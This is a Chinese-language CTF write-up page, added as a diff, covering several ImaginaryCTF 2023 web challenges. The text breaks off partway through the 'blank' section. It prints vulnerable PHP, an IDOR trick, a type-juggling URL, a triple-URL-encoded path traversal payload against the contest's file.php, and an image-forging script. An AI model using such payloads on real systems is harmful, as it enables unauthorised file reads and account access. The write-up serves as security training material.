@@ -1,0 +1,486 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/@fortawesome/fontawesome-free@6.2.1/css/all.min.css" integrity="sha256-Z1K5uhUaJXA7Ll0XrZ/0JhX4lAtZFpT6jkKrEDT0drU=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://unpkg.com/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"gudiffany.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.14.2","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="2023ImaginaryCTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2023ImaginaryCTF">
+<meta property="og:url" content="https://gudiffany.github.io/2023/08/16/13-36-40/index.html">
+<meta property="og:site_name" content="diffany">
+<meta property="og:description" content="2023ImaginaryCTF">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://gudiffany.github.io/img/image-20230723221756872.png">
+<meta property="og:image" content="https://gudiffany.github.io/img/image-20230723221906823.png">
+<meta property="og:image" content="https://gudiffany.github.io/img/image-20230723222300380.png">
+<meta property="og:image" content="https://gudiffany.github.io/img/image-20230724124904514.png">
+<meta property="article:published_time" content="2023-08-16T05:36:40.000Z">
+<meta property="article:modified_time" content="2023-08-16T05:43:27.873Z">
+<meta property="article:author" content="diffany">
+<meta property="article:tag" content="2023ctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gudiffany.github.io/img/image-20230723221756872.png">
+
+
+<link rel="canonical" href="https://gudiffany.github.io/2023/08/16/13-36-40/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://gudiffany.github.io/2023/08/16/13-36-40/","path":"2023/08/16/13-36-40/","title":"2023ImaginaryCTF"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>2023ImaginaryCTF | diffany</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">diffany</p>
+      <i class="logo-line"></i>
+    </a>
+      <img class="custom-logo-image" src="/uploads/custom-logo.png" alt="diffany">
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-友情链接"><a href="/friend/" rel="section"><i class="fa fa-sitemap fa-fw"></i>友情链接</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">1.</span> <span class="nav-text">2023ImaginaryCTF</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">2.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#inspection"><span class="nav-number">2.1.</span> <span class="nav-text">inspection</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Idoriot"><span class="nav-number">2.2.</span> <span class="nav-text">Idoriot</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#idoriot-revenge"><span class="nav-number">2.3.</span> <span class="nav-text">idoriot-revenge</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#roks"><span class="nav-number">2.4.</span> <span class="nav-text">roks</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Perfect-Picture"><span class="nav-number">2.5.</span> <span class="nav-text">Perfect Picture</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#blank"><span class="nav-number">2.6.</span> <span class="nav-text">blank</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#login"><span class="nav-number">2.7.</span> <span class="nav-text">login</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">3.</span> <span class="nav-text">Re</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">diffany</p>
+  <div class="site-description" itemprop="description">一个努力学习的菜鸟</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">26</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://unpkg.com/@creativecommons/vocabulary@2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+        <div class="pjax">
+        </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://gudiffany.github.io/2023/08/16/13-36-40/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="diffany">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="diffany">
+      <meta itemprop="description" content="一个努力学习的菜鸟">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="2023ImaginaryCTF | diffany">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2023ImaginaryCTF<a href="https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name/_posts/2023ImaginaryCTF.md" class="post-edit-link" title="编辑" rel="noopener" target="_blank"><i class="fa fa-pen-nib"></i></a>
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2023-08-16 13:36:40 / 修改时间：13:43:27" itemprop="dateCreated datePublished" datetime="2023-08-16T13:36:40+08:00">2023-08-16</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/2023wp/" itemprop="url" rel="index"><span itemprop="name">2023wp</span></a>
+        </span>
+    </span>
+
+  
+    <span id="/2023/08/16/13-36-40/" class="post-meta-item leancloud_visitors" data-flag-title="2023ImaginaryCTF" title="阅读次数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span class="leancloud-visitors-count"></span>
+    </span>
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1>2023ImaginaryCTF</h1>
+<span id="more"></span>
+<h1>Web</h1>
+<h2 id="inspection">inspection</h2>
+<p><img src="/img/image-20230723221756872.png" alt="image-20230723221756872" /></p>
+<h2 id="Idoriot">Idoriot</h2>
+<p><img src="/img/image-20230723221906823.png" alt="image-20230723221906823" /></p>
+<p>注册时可以直接更改user_id</p>
+<h2 id="idoriot-revenge">idoriot-revenge</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check if user is logged in</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user_id&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check if session is expired</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">time</span>() &gt; <span class="variable">$_SESSION</span>[<span class="string">&#x27;expires&#x27;</span>]) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: logout.php&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Display user ID on landing page</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Welcome, User ID: &quot;</span> . <span class="title function_ invoke__">urlencode</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user_id&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get the user for admin</span></span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="string">&#x27;sqlite:memory:&#x27;</span>);</span><br><span class="line"><span class="variable">$admin</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;SELECT * FROM users WHERE username = &quot;admin&quot; LIMIT 1&#x27;</span>)-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check user_id</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;user_id&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$user_id</span> = (<span class="keyword">int</span>) <span class="variable">$_GET</span>[<span class="string">&#x27;user_id&#x27;</span>];</span><br><span class="line">    <span class="comment">// Check if the user is admin</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$user_id</span> == <span class="string">&quot;php&quot;</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&quot;</span>.<span class="variable">$admin</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&quot;/&quot;</span>, <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>])) &#123;</span><br><span class="line">        <span class="comment">// Read the flag from flag.txt</span></span><br><span class="line">        <span class="variable">$flag</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag.txt&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;Flag&lt;/h1&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;<span class="subst">$flag</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Display the source code for this file</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;Source Code&lt;/h1&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>审计代码，需要满足</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$user_id</span> == <span class="string">&quot;php&quot;</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&quot;</span>.<span class="variable">$admin</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&quot;/&quot;</span>, <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>])</span><br></pre></td></tr></table></figure>
+<p>前者只是需要传入字符串或者0</p>
+<p>后者通过正则判断用户名是否含有admin</p>
+<p><img src="/img/image-20230723222300380.png" alt="image-20230723222300380" /></p>
+<p>任意注册一个，修改id就行了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://idoriot-revenge.chal.imaginaryctf.org/index.php?user_id=0</span><br></pre></td></tr></table></figure>
+<h2 id="roks">roks</h2>
+<p>给了源码，重点关注file.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="variable">$filename</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">str_contains</span>(<span class="variable">$filename</span>, <span class="string">&quot;/&quot;</span>) <span class="keyword">or</span> <span class="title function_ invoke__">str_contains</span>(<span class="variable">$filename</span>, <span class="string">&quot;.&quot;</span>)) &#123;</span><br><span class="line">    <span class="variable">$contentType</span> = <span class="title function_ invoke__">mime_content_type</span>(<span class="string">&quot;stopHacking.png&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type: <span class="subst">$contentType</span>&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">readfile</span>(<span class="string">&quot;stopHacking.png&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$filePath</span> = <span class="string">&quot;images/&quot;</span> . <span class="title function_ invoke__">urldecode</span>(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="variable">$contentType</span> = <span class="title function_ invoke__">mime_content_type</span>(<span class="variable">$filePath</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type: <span class="subst">$contentType</span>&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">readfile</span>(<span class="variable">$filePath</span>);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>首先先url解码，如果出现<code>/</code>或者<code>.</code>就gg了，但是else会再一次解码</p>
+<p>那就是三次编码即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://roks.chal.imaginaryctf.org/file.php?file=%25%32%35%25%33%32%25%36%35%25%32%35%25%33%32%25%36%35%25%32%35%25%33%32%25%36%36%25%32%35%25%33%32%25%36%35%25%32%35%25%33%32%25%36%35%25%32%35%25%33%32%25%36%36%25%32%35%25%33%32%25%36%35%25%32%35%25%33%32%25%36%35%25%32%35%25%33%32%25%36%36%25%32%35%25%33%32%25%36%35%25%32%35%25%33%32%25%36%35%25%32%35%25%33%32%25%36%36%25%32%35%25%33%32%25%36%35%25%32%35%25%33%32%25%36%35%25%32%35%25%33%32%25%36%36%25%32%35%25%33%32%25%36%35%25%32%35%25%33%32%25%36%35%25%32%35%25%33%32%25%36%36%25%32%35%25%33%32%25%36%35%25%32%35%25%33%32%25%36%35%25%32%35%25%33%32%25%36%36%25%32%35%25%33%32%25%36%35%25%32%35%25%33%32%25%36%35%25%32%35%25%33%32%25%36%36%25%32%35%25%33%36%25%33%36%25%32%35%25%33%36%25%36%33%25%32%35%25%33%36%25%33%31%25%32%35%25%33%36%25%33%37%25%32%35%25%33%32%25%36%35%25%32%35%25%33%37%25%33%30%25%32%35%25%33%36%25%36%35%25%32%35%25%33%36%25%33%37</span><br></pre></td></tr></table></figure>
+<h2 id="Perfect-Picture"><strong>Perfect Picture</strong></h2>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">uploaded_image</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        flag = f.read()</span><br><span class="line">    <span class="keyword">with</span> Image.<span class="built_in">open</span>(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] + uploaded_image) <span class="keyword">as</span> image:</span><br><span class="line">        w, h = image.size</span><br><span class="line">        <span class="keyword">if</span> w != <span class="number">690</span> <span class="keyword">or</span> h != <span class="number">420</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> image.getpixel((<span class="number">412</span>, <span class="number">309</span>)) != (<span class="number">52</span>, <span class="number">146</span>, <span class="number">235</span>, <span class="number">123</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> image.getpixel((<span class="number">12</span>, <span class="number">209</span>)) != (<span class="number">42</span>, <span class="number">16</span>, <span class="number">125</span>, <span class="number">231</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> image.getpixel((<span class="number">264</span>, <span class="number">143</span>)) != (<span class="number">122</span>, <span class="number">136</span>, <span class="number">25</span>, <span class="number">213</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> exiftool.ExifToolHelper() <span class="keyword">as</span> et:</span><br><span class="line">        metadata = et.get_metadata(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] + uploaded_image)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> metadata[<span class="string">&quot;PNG:Description&quot;</span>] != <span class="string">&quot;jctf&#123;not_the_flag&#125;&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">            <span class="keyword">if</span> metadata[<span class="string">&quot;PNG:Title&quot;</span>] != <span class="string">&quot;kool_pic&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">            <span class="keyword">if</span> metadata[<span class="string">&quot;PNG:Author&quot;</span>] != <span class="string">&quot;anon&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> flag</span><br></pre></td></tr></table></figure>
+<p>只要上传的图片能过check就行</p>
+<p>槽点：这种题应该放misc的</p>
+<p>脚本一把梭，需要配置一下exiftool.exe到环境变量</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_flag_image</span>(<span class="params">filename</span>):</span><br><span class="line">    img = Image.new(<span class="string">&#x27;RGBA&#x27;</span>, (<span class="number">690</span>, <span class="number">420</span>), color=(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>))</span><br><span class="line">    draw = ImageDraw.Draw(img)</span><br><span class="line">    draw.point((<span class="number">412</span>, <span class="number">309</span>), fill=(<span class="number">52</span>, <span class="number">146</span>, <span class="number">235</span>, <span class="number">123</span>))</span><br><span class="line">    draw.point((<span class="number">12</span>, <span class="number">209</span>), fill=(<span class="number">42</span>, <span class="number">16</span>, <span class="number">125</span>, <span class="number">231</span>))</span><br><span class="line">    draw.point((<span class="number">264</span>, <span class="number">143</span>), fill=(<span class="number">122</span>, <span class="number">136</span>, <span class="number">25</span>, <span class="number">213</span>))</span><br><span class="line">    img.save(filename)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_image_metadata</span>(<span class="params">image_path</span>):</span><br><span class="line">    metadata = &#123;</span><br><span class="line">        <span class="string">&quot;PNG:Description&quot;</span>: <span class="string">&quot;jctf&#123;not_the_flag&#125;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;PNG:Title&quot;</span>: <span class="string">&quot;kool_pic&quot;</span>,</span><br><span class="line">        <span class="string">&quot;PNG:Author&quot;</span>: <span class="string">&quot;anon&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    command = [<span class="string">&quot;exiftool&quot;</span>, <span class="string">&quot;-overwrite_original&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> tag, value <span class="keyword">in</span> metadata.items():</span><br><span class="line">        command.append(<span class="string">f&quot;-<span class="subst">&#123;tag&#125;</span>=<span class="subst">&#123;value&#125;</span>&quot;</span>)</span><br><span class="line">    command.append(image_path)</span><br><span class="line"></span><br><span class="line">    subprocess.run(command, capture_output=<span class="literal">True</span>, text=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view_image_metadata</span>(<span class="params">image_path</span>):</span><br><span class="line">    command = [<span class="string">&quot;exiftool&quot;</span>, image_path]</span><br><span class="line">    result = subprocess.run(command, capture_output=<span class="literal">True</span>, text=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> result.returncode == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Metadata for image: &quot;</span>, image_path)</span><br><span class="line">        <span class="built_in">print</span>(result.stdout)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error:&quot;</span>, result.stderr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">img_filename = <span class="string">&quot;flag.png&quot;</span></span><br><span class="line"></span><br><span class="line">created_filename = create_flag_image(img_filename)</span><br><span class="line">set_image_metadata(img_filename)</span><br><span class="line">view_image_metadata(img_filename)</span><br></pre></td></tr></table></figure>
+<h2 id="blank">blank</h2>
+<p>sqlite3的注入（但是没有完全注入）</p>
+<p>只需要能够登录为admin就行</p>
+<p>那么username设置为admin</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">error</span>(err);</span><br><span class="line">      res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Error retrieving user&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (row) &#123;</span><br><span class="line">        req.<span 